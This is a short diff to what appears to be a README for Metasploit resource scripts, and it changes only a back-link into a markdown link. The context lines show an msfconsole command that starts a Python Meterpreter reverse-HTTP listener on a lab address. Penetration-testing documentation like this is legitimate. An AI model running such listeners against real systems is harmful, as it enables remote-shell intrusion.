@@ -45,4 +45,4 @@ Example 3: Starting a Python Meterpreter Listener
 msfconsole -x "set PAYLOAD python/meterpreter_reverse_http; set LHOST 10.10.10.1; set LPORT 80; resource resource_scripts/flexible_listener.rc"
 By using this flexible script, you avoid creating dozens of different .rc files for each payload you might need.
 ```
-<-- Back to Main README
+[<-- Back to Main README](../../README.md)
